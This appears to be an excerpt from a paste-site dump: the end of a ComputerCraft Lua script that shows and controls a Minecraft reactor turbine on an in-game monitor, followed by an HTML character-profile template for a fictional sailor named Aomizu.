   for name,data in pairs(button) do
      local on = data[""active""]
      currColor = data[""color""]
      fill(name, currColor, data)
   end
end
 
-- stuff and things for buttons
 
function flash(name)
    screen()
end
 
-- magical handler for clicky clicks
 
function checkxy(x, y)
   for name, data in pairs(button) do
      if y>=data[""ymin""] and  y <= data[""ymax""] then
         if x>=data[""xmin""] and x<= data[""xmax""] then
            data[""func""](data[""elem""], data[""elem2""])
            flash(data['name'])
            return true
            --data[""active""] = not data[""active""]
            --print(name)
         end
      end
   end
   return false
end
 
-- Don't question my code, it works on my machine...
 
function label(w, h, text)
   mon.setCursorPos(w, h)
   mon.write(text)
end
 
-- Draw function : put's all the beautiful magic in the screen
 
function draw()
    for key,value in pairs(filleds) do
        local counter = 1
        for i=value[2],value[4],1 do
            paintutils.drawLine(value[1] , value[2]+counter, value[3], value[2]+counter, value[5])
            counter = counter + 1
        end
    end
 
    for key,value in pairs(boxes) do
        paintutils.drawLine(value[1] , value[2], value[1], value[4], value[5])
        paintutils.drawLine(value[1] , value[2], value[3], value[2], value[5])
        paintutils.drawLine(value[1] , value[4], value[3], value[4], value[5])
        paintutils.drawLine(value[3] , value[2], value[3], value[4], value[5])
    end
 
    for key,value in pairs(lines) do
        paintutils.drawLine(value[1] , value[2], value[3], value[4], value[5])
    end
 
    for key,value in pairs(texts) do
        mon.setCursorPos(value[1], value[2])
        mon.setTextColor(value[4])
        mon.setBackgroundColor(value[5])
        mon.write(value[3])
    end
    screen()
    resetDraw()
end
 
-- Resets the elements to draw to only draw the neccessity
 
function resetDraw()
    filleds = {}
    boxes = {}
    lines = {}
    texts = {}
end
 
-- Handles all the clicks for the buttons
 
function clickEvent()
    local myEvent={os.pullEvent(""monitor_touch"")}
    checkxy(myEvent[3], myEvent[4])
end
 
-- Power up the turbine (M&N are a good source of food right?)
 
function powerUp(m,n)
    local turbine = turbines[1]
    turbine.setActive(true)
end
 
-- Power down the turbine (M&N are a good source of food right?)
 
function powerDown(m,n)
    local turbine = turbines[1]
    turbine.setActive(false)
end
 
-- Handles and calculate the Min and Max of the power limitation
 
function modifyRods(limit, number)
    local tempLevel = 0
 
    if limit == ""min"" then
        tempLevel = minPowerRod + number
        if tempLevel <= 0 then
            minPowerRod = 0
        end
 
        if tempLevel >= maxPowerRod then
            minPowerRod = maxPowerRod -10
        end
 
        if tempLevel < maxPowerRod and tempLevel > 0 then
            minPowerRod = tempLevel
        end
    else
        tempLevel = maxPowerRod + number
        if tempLevel <= minPowerRod then
            maxPowerRod = minPowerRod +10
        end
 
        if tempLevel >= 100 then
            maxPowerRod = 100
        end
 
        if tempLevel > minPowerRod and tempLevel < 100 then
            maxPowerRod = tempLevel
        end
    end
 
    table.insert(lines, {controlsSize['inX'], controlsSize['inY'] +(controlsSize['sectionHeight']*1)+4, controlsSize['inX'] + controlsSize['width'], controlsSize['inY']+(controlsSize['sectionHeight']*1)+4, colors.black})
 
    table.insert(texts, {controlsSize['inX']+5, controlsSize['inY'] +(controlsSize['sectionHeight']*1)+4, minPowerRod .. '%', colors.lightBlue, colors.black})
    table.insert(texts, {controlsSize['inX']+13, controlsSize['inY'] +(controlsSize['sectionHeight']*1)+4, '--', colors.white, colors.black})
    table.insert(texts, {controlsSize['inX']+20, controlsSize['inY'] +(controlsSize['sectionHeight']*1)+4, maxPowerRod .. '%', colors.purple, colors.black})
 
    setInfoToFile()
    adjustRodsLevel()
end
 
-- Calculate and adjusts the level of the rods
-- TOMODIFY
function adjustRodsLevel()
    local turbine = turbines[1]
 
    local allStats = getAllStats()
    local currentRfTotal = allStats[""rfTotal""]
    local turbineRodsLevel = allStats[""turbineRodsLevel""]
 
    differenceMinMax = maxPowerRod - minPowerRod
 
    maxPower = (rfTotalMax/100) * maxPowerRod
    minPower = (rfTotalMax/100) * minPowerRod
 
    if currentRfTotal >= maxPower then
        currentRfTotal = maxPower
    end
 
    if currentRfTotal <= minPower then
        currentRfTotal = minPower
    end
 
    currentRfTotal = currentRfTotal - (rfTotalMax/100) * minPowerRod
 
    local rfInBetween = (rfTotalMax/100) * differenceMinMax
    local rodLevel = math.ceil((currentRfTotal/rfInBetween)*100)
    if VERSION == ""EXTREME"" then
        for key,value in pairs(turbineRodsLevel) do 
            turbineRodsLevel[key] = rodLevel
        end
        turbine.setControlRodsLevels(turbineRodsLevel)
    else
        turbine.setAllControlRodLevels(rodLevel)
    end
end
 
-- Creates the frame and the basic of the visual
-- Also adds the variables informations for placement of stuff and things
 
function addDrawBoxesSingleturbine()
    local w, h = mon.getSize()
    local margin = math.floor((w/100)*2)

    -- Controls
 
    controlsSize['startX'] =  margin + 1
    controlsSize['startY'] =  margin + 1
    controlsSize['endX'] = w-margin
    controlsSize['endY'] = (((h - (margin*2))/3)*2) +1
    controlsSize['height'] = controlsSize['endY']-controlsSize['startY']-(margin)-1
    controlsSize['width'] = controlsSize['endX']-controlsSize['startX']-(margin*2)-2
    controlsSize['inX'] = controlsSize['startX'] + margin +1
    controlsSize['inY'] = controlsSize['startY'] + margin
 
    table.insert(boxes, {controlsSize['startX'] , controlsSize['startY'], controlsSize['endX'], controlsSize['endY'], colors.gray})
    name = ""CONTROLS""
    table.insert(lines, {controlsSize['startX'] + margin , controlsSize['startY'], controlsSize['startX'] + (margin*2) + #name+1, controlsSize['startY'], colors.black})
    table.insert(texts, {controlsSize['startX'] + (margin*2), controlsSize['startY'], name, colors.white, colors.black})
 
    controlsSize['sectionHeight'] = math.floor(controlsSize['height']/4)
 
    turbine = turbines[1]
 
    mon.setTextColor(colors.white)
    setButton(""ON"",""ON"", powerUp, controlsSize['inX'], controlsSize['inY'], controlsSize['inX'] + math.floor(controlsSize['width']/2) -1, controlsSize['inY'] +2, 0, 0, colors.green)
    setButton(""OFF"",""OFF"", powerDown, controlsSize['inX'] + math.floor(controlsSize['width']/2) +2, controlsSize['inY'], controlsSize['inX'] + controlsSize['width'], controlsSize['inY'] +2,0, 0, colors.red)
 
    table.insert(texts, {controlsSize['inX']+8, controlsSize['inY'] +(controlsSize['sectionHeight']*1)+1, 'AUTO-CONTROL', colors.white, colors.black})
 
    table.insert(texts, {controlsSize['inX']+5, controlsSize['inY'] +(controlsSize['sectionHeight']*1)+3, 'MIN', colors.lightBlue, colors.black})
    table.insert(texts, {controlsSize['inX']+5, controlsSize['inY'] +(controlsSize['sectionHeight']*1)+4, minPowerRod..'%', colors.lightBlue, colors.black})
 
    table.insert(texts, {controlsSize['inX']+13, controlsSize['inY'] +(controlsSize['sectionHeight']*1)+4, '--', colors.white, colors.black})
    table.insert(texts, {controlsSize['inX']+20, controlsSize['inY'] +(controlsSize['sectionHeight']*1)+3, 'MAX', colors.purple, colors.black})
    table.insert(texts, {controlsSize['inX']+20, controlsSize['inY'] +(controlsSize['sectionHeight']*1)+4, maxPowerRod..'%', colors.purple, colors.black})
    mon.setTextColor(colors.white)
 
    setButton(""low-10"",""-10"", modifyRods, controlsSize['inX'], controlsSize['inY'] +(controlsSize['sectionHeight']*2)+2, controlsSize['inX'] + math.floor(controlsSize['width']/2) -1, controlsSize['inY'] +(controlsSize['sectionHeight']*2)+4, ""min"", -10, colors.lightBlue)
    setButton(""high-10"",""-10"", modifyRods, controlsSize['inX'] + math.floor(controlsSize['width']/2) +2, controlsSize['inY'] +(controlsSize['sectionHeight']*2)+2, controlsSize['inX'] + controlsSize['width'], controlsSize['inY'] +(controlsSize['sectionHeight']*2)+4, ""max"", -10, colors.purple)
 
    setButton(""low+10"",""+10"", modifyRods, controlsSize['inX'], controlsSize['inY'] +(controlsSize['sectionHeight']*3)+2, controlsSize['inX'] + math.floor(controlsSize['width']/2) -1, controlsSize['inY'] +(controlsSize['sectionHeight']*3)+4, ""min"", 10, colors.lightBlue)
    setButton(""high+10"",""+10"", modifyRods, controlsSize['inX'] + math.floor(controlsSize['width']/2) +2, controlsSize['inY'] +(controlsSize['sectionHeight']*3)+2, controlsSize['inX'] + controlsSize['width'], controlsSize['inY'] +(controlsSize['sectionHeight']*3)+4, ""max"", 10, colors.purple)
 
    -- Numbers
 
    numbersSize['startX'] = margin + 1
    numbersSize['startY'] = controlsSize['endY'] + margin + 1
    numbersSize['endX'] = w-margin
    numbersSize['endY'] = h-margin
    numbersSize['height'] = numbersSize['endY']-numbersSize['startY']-(margin)-1
    numbersSize['width'] = numbersSize['endX']-numbersSize['startX']-(margin*2)-2
    numbersSize['inX'] = numbersSize['startX'] + margin +1
    numbersSize['inY'] = numbersSize['startY'] + margin
 
    table.insert(boxes, {numbersSize['startX'] , numbersSize['startY'], numbersSize['endX'], numbersSize['endY'], colors.gray})
    name = ""NUMBERS""
    table.insert(lines, {numbersSize['startX'] + margin , numbersSize['startY'], numbersSize['startX'] + (margin*2) + #name+1, numbersSize['startY'], colors.black})
    table.insert(texts, {numbersSize['startX'] + (margin*2), numbersSize['startY'], name, colors.white, colors.black})
 
    refresh = true
    while refresh do
        parallel.waitForAny(refreshSingleturbine,clickEvent)
    end
end
 
-- Gets the stats needed for the program to function based on the version of the turbine
-- TOMODIFY
function getAllStats()
    local stats = {}
    local turbine = turbines[1]
 
    if VERSION == ""EXTREME"" then 
        local turbineEnergyStats = turbine.getEnergyStats()
        local turbineFuelStats = turbine.getFuelStats()
 
        stats[""turbineRodsLevel""] = turbine.getControlRodsLevels()
        stats[""rfTotal""] = math.floor(turbineEnergyStats[""energyStored""])
        stats[""rfPerTick""] = math.floor(turbineEnergyStats[""energyProducedLastTick""])
        stats[""rodLevel""] = stats[""turbineRodsLevel""][0]
        stats[""fuelPerTick""] = round(turbineFuelStats[""fuelConsumedLastTick""], 2)
    elseif VERSION == ""BIG"" or VERSION == ""BIGGERv1"" then  
        stats[""rfTotal""] = math.floor(turbine.getEnergyStored())
        stats[""rfPerTick""] = math.floor(turbine.getEnergyProducedLastTick())
        stats[""rodLevel""] = math.floor(turbine.getControlRodLevel(0))
        stats[""fuelPerTick""] = turbine.getFuelConsumedLastTick()
    elseif VERSION == ""BIGGERv2"" then 
        stats[""rfTotal""] = turbine.battery().stored()
        stats[""rfPerTick""] = math.floor(turbine.battery().producedLastTick())
        stats[""rodLevel""] = math.floor(turbine.getControlRod(0).level())
        stats[""fuelPerTick""] = turbine.fuelTank().burnedLastTick()
    end
    
    return stats 
end

-- Makes and Handles the draw function for less lag in the visual
function refreshSingleturbine()
    local rfPerTick = 0
    local rfTotal = 0
    local turbine = turbines[1]
 
    local allStats = getAllStats()
    rfTotal = allStats[""rfTotal""]
    rfPerTick = allStats[""rfPerTick""]
    rodLevel = allStats[""rodLevel""]
    fuelPerTick = allStats[""fuelPerTick""]
 
    local i = 0
    local infotoAdd = 'RF PER TICK : '
 
    if currentRfTick ~= rfPerTick then
        currentRfTick = rfPerTick
        if rfPerTick > rfPerTickMax then
            rfPerTickMax = rfPerTick
        end
 
        table.insert(lines, {numbersSize['inX'] , numbersSize['inY'],numbersSize['inX'] + numbersSize['width'] , numbersSize['inY'], colors.black})
        table.insert(texts, {numbersSize['inX'], numbersSize['inY'], infotoAdd .. rfPerTick .. "" RF"", colors.white, colors.black})
 
    end
 
    i = 1
    infotoAdd = 'ENERGY STORED : '
    if currentRfTotal ~= rfTotal then
        currentRfTotal = rfTotal
        table.insert(lines, {numbersSize['inX'] , numbersSize['inY'] +2 ,numbersSize['inX'] + numbersSize['width'] , numbersSize['inY'] +2, colors.black})
        table.insert(texts, {numbersSize['inX'], numbersSize['inY']+ 2 , infotoAdd .. rfTotal .. "" RF"", colors.white, colors.black})
    end
 
    i = 2
    infotoAdd = 'CONTROL ROD LEVEL : '
    if currentRodLevel ~= rodLevel then
        currentRodLevel = rodLevel
        table.insert(lines, {numbersSize['inX'] , numbersSize['inY']+4 ,numbersSize['inX'] + numbersSize['width'] , numbersSize['inY'] +4, colors.black})
        table.insert(texts, {numbersSize['inX'], numbersSize['inY']+ 4 , infotoAdd .. rodLevel .. ""%"", colors.white, colors.black})
    end
 
    i = 3
    infotoAdd = 'FUEL USAGE : '
    if currentFuelConsumedLastTick ~= fuelPerTick then
        currentFuelConsumedLastTick = fuelPerTick
 
        table.insert(lines, {numbersSize['inX'] , numbersSize['inY']+6 ,numbersSize['inX'] + numbersSize['width'] , numbersSize['inY'] +6, colors.black})
        table.insert(texts, {numbersSize['inX'], numbersSize['inY']+ 6 , infotoAdd .. format_num(tonumber(fuelPerTick),3) .. ""mb/t"", colors.white, colors.black})
    end
 
    mon.setTextColor(colors.white)
    adjustRodsLevel()
 
    draw()
 
    sleep(2)
end
 
--
-- ** Get the informations from the index file
-- line 1 = min ROD
-- line 2 = max ROD
--
 
function getInfoFromFile()
 
     if (fs.exists(index.."".txt"") == false) then
        file = io.open(index.."".txt"",""w"")
        file:write(""0"")
        file:write(""\n"")
        file:write(""100"")
        file:close()
    else
        file = fs.open(index.."".txt"",""r"")
        minPowerRod = tonumber(file.readLine())
        maxPowerRod = tonumber(file.readLine())
        file.close()
    end
end
 
-- Save informations to the index file
 
function setInfoToFile()
    file = io.open(index.."".txt"",""w"")
    file:write(minPowerRod .. ""\n"" .. maxPowerRod)
    file:flush()
    file:close()
end
 
---============================================================
-- add comma to separate thousands
-- From Lua-users.org/wiki/FormattingNumbers
--
--
function comma_value(amount)
  local formatted = amount
  while true do
    formatted, k = string.gsub(formatted, ""^(-?%d+)(%d%d%d)"", '%1,%2')
    if (k==0) then
      break
    end
  end
  return formatted
end
 
---============================================================
-- rounds a number to the nearest decimal places
-- From Lua-users.org/wiki/FormattingNumbers
--
--
function round(val, decimal)
  if (decimal) then
    return math.floor( (val * 10^decimal) + 0.5) / (10^decimal)
  else
    return math.floor(val+0.5)
  end
end
 
--===================================================================
-- given a numeric value formats output with comma to separate thousands
-- and rounded to given decimal places
-- From Lua-users.org/wiki/FormattingNumbers
--
function format_num(amount, decimal, prefix, neg_prefix)
  local str_amount,  formatted, famount, remain
 
  decimal = decimal or 2  -- default 2 decimal places
  neg_prefix = neg_prefix or ""-"" -- default negative sign
 
  famount = math.abs(round(amount,decimal))
  famount = math.floor(famount)
 
  remain = round(math.abs(amount) - famount, decimal)
 
        -- comma to separate the thousands
  formatted = comma_value(famount)
 
        -- attach the decimal portion
  if (decimal > 0) then
    remain = string.sub(tostring(remain),3)
    formatted = formatted .. ""."" .. remain ..
                string.rep(""0"", decimal - string.len(remain))
  end
 
        -- attach prefix string e.g '$'
  formatted = (prefix or """") .. formatted
 
        -- if value is negative then format accordingly
  if (amount<0) then
    if (neg_prefix==""()"") then
      formatted = ""(""..formatted .."")""
    else
      formatted = neg_prefix .. formatted
    end
  end
 
  return formatted
end
 
-- Clear and make the pixel smaller because we are not blind
 
mon.setBackgroundColor(colors.black)
mon.clear()
mon.setTextScale(0.5)
 
-- Get the information from the index file
getInfoFromFile()
 
 
-- Add's the visual and starts the Loop
addDrawBoxesSingleturbine()"
3ndBCVCE,aomizu,vermilly,HTML,Friday 1st of March 2024 05:07:59 PM CDT,"<div class=""container-fluid px-0 py-lg-1 py-0"" style=""max-width:900px;font-size:90%;"">
<div class=""row no-gutters"">
<div class=""col-12 p-1"">

<div class=""display-1 text-white text-center text-uppercase py-4"" style=""font-size:1.75rem;min-height:50px;letter-spacing:1px;background-color:#233620;background-image:url('https://wallpapers.com/images/hd/aesthetic-anime-desktop-bubbles-in-clouds-wdpf2gwgxwmsx24o.jpg');background-blend-mode:soft-light;background-position:center;background-size:cover;"">
  
<div class=""col-md-4"">
Aomizu [青水]
</div>

<div class=""hidden-md-up"" style=""height:50px;""></div>
</div>
</div>
<div class=""col-md-4 push-md-8 p-1"">
<div class=""flex-column bg-faded p-3 h-100 text-center"">
  
  <img src=""https://f2.toyhou.se/file/f2-toyhou-se/characters/19929873?1706121729"" class=""rounded-circle mx-auto p-2 bg-faded"" style=""width:130px;height:130px;margin-top:-75px;""/>
  
<div class=""justify-content-between my-auto p-1"">
<span class=""text-uppercase"">Name</span>
<span class=""text-muted"">Aomizu [青水]</span>
</div>
<div class=""justify-content-between my-auto p-1"">
<span class=""text-uppercase"">Gender</span>
<span class=""text-muted"">Nonbinary [He/she]</span>
</div>
<div class=""justify-content-between my-auto p-1"">
<span class=""text-uppercase"">Age</span>
<span class=""text-muted"">Adult</span>
</div>

<div class=""justify-content-between my-auto p-1"">
<span class=""text-uppercase"">Species</span>
<span class=""text-muted"">Human</span>
</div>
<div class=""justify-content-between my-auto p-1"">
<span class=""text-uppercase"">Occupation</span>
<span class=""text-muted"">Sailor</span>
</div>


</div>
</div>
<div class=""col-md-8 pull-md-4 row no-gutters"">
<div class=""col-12 p-1"">
<div class=""flex-column bg-faded p-3 h-100"">

<div class=""table-responsive flex-fill p-2 text-muted"" style=""height:240px;"">
  
  <p><b>Biography</b>: A young lad that works with sirens at sea, luring people into their territory with her bells. As a sailor, she rides on boats, dangling and jingling the bells, which soon are followed by the sirens' singing. In exchange for his luring services, the sirens give him whatever they desire - turns out, he's a simple person to please. Water, food, boats, a safe place on the nearest island to sleep... and a family.</p> 
  
  <p>When the sirens first encountered Aomizu, they intended to lure her in just like any other sailor. Yet, her main desire was to have a family, and she was keen on having the sirens as her family. Stunned, but charmed, they let him work with them, and as time passed, they grew fond of each other. Though, don't mistake their sweet bond for innocence... they will play dirty. After all, aren't you getting closer to the sirens right now?</p>


<hr>

<b>Trivia:</b>
<ul class=""pl-4 mb-0"">
<li class=""mb-2"">Aomizu [青水] literally means ""blue water"" in Japanese.</li>
<li class=""mb-2"">His yellow eye was bestowed upon by the sirens, indicating he's connected to them.</li>


</ul>
 
</div>
</div>
</div>

</div>
</div>
<a class=""d-block text-right pt-1 faded"" href=""https://toyhou.se/2642675"" style=""font-size:10px;"">
<i class=""fal fa-code""></i>
</a>
</div>
</div>
</div>"
